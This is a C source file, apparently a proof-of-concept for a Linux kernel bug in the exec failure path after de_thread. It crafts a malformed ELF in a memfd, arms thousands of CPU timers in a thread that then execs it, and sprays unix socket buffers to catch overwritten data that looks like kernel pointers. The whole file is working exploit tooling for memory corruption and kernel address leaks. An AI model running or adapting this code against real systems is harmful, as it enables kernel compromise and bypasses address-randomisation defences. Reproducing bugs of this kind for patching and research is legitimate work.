/*
 * badelf - drive the post-de_thread failure path without an external SIGKILL.
 *
 * begin_new_exec() succeeds (de_thread runs), then load_elf_binary() fails on a
 * malformed PT_LOAD. The task dies at the point of no return, which is exactly
 * the region the published fix reordered.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define N_TIMERS 2048
#define N_STREAMS 256
#define KVA 0xffff000000000000ULL

static void noop(int s) { (void)s; }
static unsigned char payload[8192];
static unsigned char base[N_STREAMS][8192];
static unsigned char now[8192];
static int sv[N_STREAMS][2];
static char g_path[64];

static int make_bad_elf(void)
{
    /* minimal ELF64 with one PT_LOAD whose p_offset is far beyond EOF */
    unsigned char h[64 + 56];
    int fd = syscall(__NR_memfd_create, "badelf", 0);
    if (fd < 0) return -1;
    memset(h, 0, sizeof(h));
    h[0] = 0x7f; h[1] = 'E'; h[2] = 'L'; h[3] = 'F';
    h[4] = 2;              /* ELFCLASS64 */
    h[5] = 1;              /* little endian */
    h[6] = 1;              /* version */
    /* e_type at 16, e_machine at 18 */
    h[16] = 2; h[17] = 0;  /* ET_EXEC */
    h[18] = 0xb7; h[19] = 0x00;   /* EM_AARCH64 */
    h[20] = 1;             /* e_version */
    /* e_entry at 24 = 0x400000 */
    h[24] = 0x00; h[25] = 0x00; h[26] = 0x40;
    /* e_phoff at 32 = 64 */
    h[32] = 64;
    /* e_ehsize 52 = 64, e_phentsize 54 = 56, e_phnum 56 = 1 */
    h[52] = 64; h[54] = 56; h[56] = 1;
    /* program header at 64 */
    {
        unsigned char *p = h + 64;
        p[0] = 1;              /* PT_LOAD */
        p[4] = 5;              /* PF_R|PF_X */
        /* p_offset at 8: 0x10000000 (way past EOF) */
        p[8] = 0x00; p[9] = 0x00; p[10] = 0x00; p[11] = 0x10;
        /* p_vaddr at 16 */
        p[16] = 0x00; p[17] = 0x00; p[18] = 0x40;
        /* p_filesz at 32 = 0x1000 */
        p[32] = 0x00; p[33] = 0x10;
        /* p_memsz at 40 = 0x1000 */
        p[40] = 0x00; p[41] = 0x10;
    }
    if (write(fd, h, sizeof(h)) != (ssize_t)sizeof(h)) { close(fd); return -1; }
    snprintf(g_path, sizeof(g_path), "/proc/self/fd/%d", fd);
    return fd;   /* keep it open so the path stays valid in the child */
}

struct lc { int fd; char *path; };

static void *exec_thread(void *arg)
{
    static timer_t many[N_TIMERS];
    struct sigevent sev;
    struct itimerspec its;
    struct lc *c = (struct lc *)arg;
    char *argv[] = { g_path, NULL };
    char *envp[] = { NULL };
    const char *ck = getenv("CLOCK_KIND");
    clockid_t clk = (ck && ck[0] == 'p') ? CLOCK_PROCESS_CPUTIME_ID : CLOCK_THREAD_CPUTIME_ID;
    int i, armed = 0;

    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL;
    sev.sigev_signo = SIGRTMIN;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_sec = 30;
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(clk, &sev, &many[i]) != 0) break;
        if (timer_settime(many[i], 0, &its, NULL) != 0) break;
        armed++;
    }
    if (c) (void)!write(c->fd, &armed, sizeof(armed));
    execve(c->path, argv, envp);
    return NULL;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 10;
    int hits = 0, r;

    memset(payload, 0, sizeof(payload));
    if (make_bad_elf() < 0) { printf("memfd failed\n"); return 1; }
    printf("=== badelf: post-de_thread failure, %d rounds ===\n", rounds);

    for (r = 0; r < rounds && hits < 3; r++) {
        int pipefd[2], i, made = 0, diffs = 0;
        pid_t child;

        if (pipe(pipefd) != 0) break;
        child = fork();
        if (child == 0) {
            struct sigaction sa;
            struct lc c;
            pthread_t th;
            int dn;
            close(pipefd[0]);
            dn = open("/dev/null", O_WRONLY);
            if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
            memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
            c.fd = pipefd[1];
            c.path = g_path;
            if (pthread_create(&th, NULL, exec_thread, &c) != 0) _exit(9);
            for (;;) pause();
        }
        close(pipefd[1]);
        { int a = 0; (void)!read(pipefd[0], &a, sizeof(a)); close(pipefd[0]); }
        usleep(20000);

        for (i = 0; i < N_STREAMS; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv[i]) != 0) break;
            if (send(sv[i][0], payload, sizeof(payload), MSG_DONTWAIT) != (ssize_t)sizeof(payload)) {
                close(sv[i][0]); close(sv[i][1]); break;
            }
            made++;
        }
        for (i = 0; i < made; i++) {
            ssize_t n = recv(sv[i][1], base[i], sizeof(base[i]), MSG_PEEK | MSG_DONTWAIT);
            if (n != (ssize_t)sizeof(base[i])) memset(base[i], 0, sizeof(base[i]));
        }
        { int st = 0; waitpid(child, &st, 0); }
        usleep(10000);
        for (i = 0; i < made; i++) {
            ssize_t n = recv(sv[i][1], now, sizeof(now), MSG_PEEK | MSG_DONTWAIT);
            int j;
            if (n != (ssize_t)sizeof(now)) continue;
            if (memcmp(now, base[i], sizeof(now)) == 0) continue;
            for (j = 0; j + 8 <= (int)sizeof(now); j += 8) {
                uint64_t a, b;
                memcpy(&a, base[i] + j, 8);
                memcpy(&b, now + j, 8);
                if (a != b && b >= KVA) {
                    printf("  HIT round %d stream[%d] +0x%03x : 0x%016llx -> 0x%016llx\n",
                           r, i, j, (unsigned long long)a, (unsigned long long)b);
                    diffs++;
                }
            }
            if (diffs >= 5) break;
        }
        for (i = 0; i < made; i++) { close(sv[i][0]); close(sv[i][1]); }
        if (diffs) hits++;
        if ((r % 5) == 0) { printf("  round %d/%d hits=%d\n", r, rounds, hits); fflush(stdout); }
    }
    printf("badelf done: hits=%d\n", hits);
    return 0;
}
